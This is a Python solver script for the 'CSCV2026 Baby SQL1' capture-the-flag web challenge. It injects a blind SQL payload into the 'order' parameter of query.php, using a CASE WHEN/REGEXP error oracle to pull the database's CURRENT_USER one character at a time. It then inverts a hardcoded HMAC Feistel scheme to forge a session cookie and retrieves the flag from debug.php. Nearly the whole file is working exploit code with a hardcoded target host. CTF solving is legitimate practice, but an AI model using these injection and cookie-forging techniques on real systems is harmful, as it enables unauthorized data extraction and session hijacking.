#!/usr/bin/env python3
"""Solver for the CSCV2026 Baby SQL1 challenge."""

from __future__ import annotations

import argparse
import hashlib
import hmac
import re
import string
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3


SEED = b"1a2b3czzPk"
MARKER = bytes.fromhex("5e4e677579656e282e2a297b31307d5824")
DEFAULT_BASE = "https://web04-640e9ed6333b.59.153.245.188.sslip.io"

# Characters normally used in a MySQL CURRENT_USER value. The pattern is
# hex-encoded before it reaches SQL, so this is not a quoting problem.
CANDIDATES = string.ascii_letters + string.digits + "_@%.-:[]"
REGEX_META = set(r"\\.^$*+?()[]{}|")


def regex_literal(value: str) -> str:
    return "".join("\\" + char if char in REGEX_META else char for char in value)


def oracle_payload(pattern: str) -> str:
    condition = pattern.encode().hex()
    marker = MARKER.hex()
    return (
        "CASE WHEN CURRENT_USER REGEXP _utf8mb4 0x"
        + condition
        + " COLLATE utf8mb4_bin THEN name REGEXP _utf8mb4 0x"
        + marker
        + " ELSE 0 END"
    )


def oracle(base: str, pattern: str, retries: int = 3) -> bool:
    url = base.rstrip("/") + "/query.php/"
    params = {"order": oracle_payload(pattern)}
    last_status = None
    for _ in range(retries):
        response = requests.get(url, params=params, verify=False, timeout=15)
        last_status = response.status_code
        if last_status == 500:
            return True
        if last_status == 200:
            return False
        if last_status == 429:
            time.sleep(0.75)
            continue
    raise RuntimeError(f"oracle returned unexpected status {last_status}")


def recover_user(base: str, max_length: int = 64) -> str:
    prefix = ""
    with ThreadPoolExecutor(max_workers=4) as pool:
        for position in range(max_length):
            if oracle(base, "^" + regex_literal(prefix) + "$"):
                return prefix

            futures = {
                char: pool.submit(oracle, base, "^" + regex_literal(prefix + char))
                for char in CANDIDATES
            }
            hits = [char for char, future in futures.items() if future.result()]
            if len(hits) != 1:
                raise RuntimeError(
                    f"position {position}: expected one hit for {prefix!r}, got {hits!r}"
                )
            prefix += hits[0]
            print(f"CURRENT_USER prefix: {prefix}", flush=True)
    raise RuntimeError("CURRENT_USER exceeded the configured maximum length")


def hmac_sha256(key: bytes, message: bytes) -> bytes:
    return hmac.new(key, message, hashlib.sha256).digest()


def whitening_mask(domain: str) -> bytes:
    return hmac_sha256(SEED, b"SQL1/WHITEN\0" + domain.encode())[:16]


def round_mask(half: bytes, round_number: int) -> bytes:
    round_bytes = struct.pack(">I", round_number)
    round_key = hmac_sha256(SEED, b"SQL1/ROUND-KEY\0" + round_bytes)
    return hmac_sha256(
        round_key, b"SQL1/ROUND-DATA\0" + half + round_bytes
    )[:8]


def session_target(current_user: str) -> bytes:
    user = current_user.encode()
    payload = struct.pack(">I", len(user)) + user
    return hmac_sha256(SEED, b"SQL1/TARGET\0" + payload)[:16]


def invert_forward(target: bytes) -> bytes:
    state = bytes(a ^ b for a, b in zip(target, whitening_mask("OUTPUT")))
    left, right = state[:8], state[8:]

    for round_number in range(23, -1, -1):
        previous_right = left
        previous_left = bytes(
            a ^ b for a, b in zip(right, round_mask(previous_right, round_number))
        )
        left, right = previous_left, previous_right

    state = left + right
    return bytes(a ^ b for a, b in zip(state, whitening_mask("INPUT")))


def forge_cookie(current_user: str) -> str:
    return invert_forward(session_target(current_user)).hex()


def fetch_flag(base: str, cookie: str) -> tuple[int, str]:
    response = requests.get(
        base.rstrip("/") + "/debug.php/",
        cookies={"CUSTOM_SESSION": cookie},
        verify=False,
        timeout=15,
    )
    return response.status_code, response.text


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--user", help="skip oracle extraction and use this CURRENT_USER")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    current_user = args.user or recover_user(args.base)
    cookie = forge_cookie(current_user)
    print(f"CURRENT_USER = {current_user}")
    print(f"CUSTOM_SESSION = {cookie}")

    status, body = fetch_flag(args.base, cookie)
    print(f"/debug.php status = {status}")
    print(body.strip())
    if status != 200:
        return 1

    match = re.search(r"CSCV2026\{[^\r\n}]+\}", body)
    if not match:
        print("No CSCV2026 flag found in the response", file=sys.stderr)
        return 1
    print(f"REMOTE_CONFIRMED: {match.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
